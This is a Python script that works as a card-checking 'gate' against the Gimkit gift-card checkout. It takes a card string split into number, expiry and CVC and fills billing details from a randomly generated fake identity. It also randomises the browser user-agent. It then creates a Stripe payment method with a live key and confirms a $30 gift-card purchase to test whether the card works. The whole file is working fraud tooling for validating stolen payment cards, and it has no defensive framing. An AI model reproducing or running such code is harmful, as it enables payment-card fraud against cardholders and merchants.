import requests
import random
import json

def check_gimkit(cc, identity):

	try:

		gate_url = "https://api.stripe.com/v1/payment_methods"
		gate2_url = "https://www.gimkit.com/api/billing/create-gift-card-session"
		gate3_url = "https://api.stripe.com/v1/payment_pages/{}/confirm"
		gate_user_agent = "Mozilla/5.0 (Windows NT {}.0; Win64; x64) AppleWebKit/{}.{} (KHTML, like Gecko) Chrome/{}.0.{}.{} Safari/{}.{}".format(random.randint(11, 99),
			random.randint(111, 999),
			random.randint(11, 99),
			random.randint(11, 99),
			random.randint(1111, 9999),
			random.randint(111, 999),
			random.randint(111, 999),
			random.randint(11, 99))
		gate_check_amount = "30"
		splited_card = cc.split("|")

		payment_header = {
			'Accept': 'application/json',
		    'Accept-language': 'es-ES,es;q=0.9',
		    'Content-type': 'application/x-www-form-urlencoded',
		    'Origin': 'https://checkout.stripe.com/',
		    'Referer': 'https://checkout.stripe.com/',
		    'Sec-fetch-dest': 'empty',
		    'Sec-fetch-mode': 'cors',
		    'Sec-fetch-site': 'same-site',
		    "User-agent": gate_user_agent
		}
		
		payment_data = 'type=card&card[number]={}&card[cvc]={}&card[exp_month]={}&card[exp_year]={}&billing_details[name]={}+{}&billing_details[email]={}&billing_details[address][country]={}&billing_details[address][line1]={}&billing_details[address][city]={}&billing_details[address][postal_code]={}&billing_details[address][state]={}&guid=87b633a6-515c-42f6-8103-15f31c28cd6cbbac76&muid=9b4a9ca4-3cd3-4351-bb05-0867dc344f96323100&sid=0803184c-76f9-447b-8491-8e290eaf7890b11657&key=pk_live_LKZ2v8hyMK4h50Hw4DqNsFIo&payment_user_agent=stripe.js%2F2c04e5ffb%3B+stripe-js-v3%2F2c04e5ffb%3B+checkout'.format(splited_card[0],
			splited_card[3],
			splited_card[1],
			splited_card[2],
			identity["results"][0]["name"]["first"],
			identity["results"][0]["name"]["last"],
			identity["results"][0]["email"],
			identity["results"][0]["nat"],
			identity["results"][0]["location"]["street"],
			identity["results"][0]["location"]["city"],
			identity["results"][0]["location"]["postcode"],
			identity["results"][0]["location"]["state"])

		payment_request = requests.post(gate_url, headers=payment_header, data=payment_data)

		if payment_request.status_code < 300:

			id_ = payment_request.json()['id']

			payment_header = {
				'Host': 'www.gimkit.com',
			    'Connection': 'keep-alive',
			    'Accept': 'application/json, text/plain, */*',
			    'Content-Type': 'application/json;charset=UTF-8',
			    'Origin': 'https://www.gimkit.com',
			    'Sec-Fetch-Site': 'same-origin',
			    'Sec-Fetch-Mode': 'cors',
			    'Sec-Fetch-Dest': 'empty',
			    'Referer': 'https://www.gimkit.com/gift-cards',
			    'Accept-Language': 'en-US,en;q=0.9',
			    "User-agent": gate_user_agent
			}

			payment_data = '{{"customAmount":{}}}'.format(gate_check_amount)

			payment_request = requests.post(gate2_url, headers=payment_header, data=payment_data)

			if payment_request.status_code < 300:

				cs = payment_request.json()['id']

				payment_header = {
					'host': 'api.stripe.com',
				    'accept': 'application/json',
				    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
				    'content-type': 'application/x-www-form-urlencoded',
				    'origin': 'https://checkout.stripe.com',
				    'referer': 'https://checkout.stripe.com',
				    'sec-fetch-dest': 'empty',
				    'sec-fetch-mode': 'cors',
				    'sec-fetch-site': 'same-site',
				    "user-agent": gate_user_agent
				}

				payment_data = 'eid=NA&payment_method={}&expected_amount=3000&expected_payment_method_type=card&key=pk_live_LKZ2v8hyMK4h50Hw4DqNsFIo'.format(id_)

				payment_request = requests.post(gate3_url.format(cs), headers=payment_header, data=payment_data)

				if payment_request.status_code < 300:

					return True

				else: return False

			else: return False

		else: return False

	except Exception as E: raise E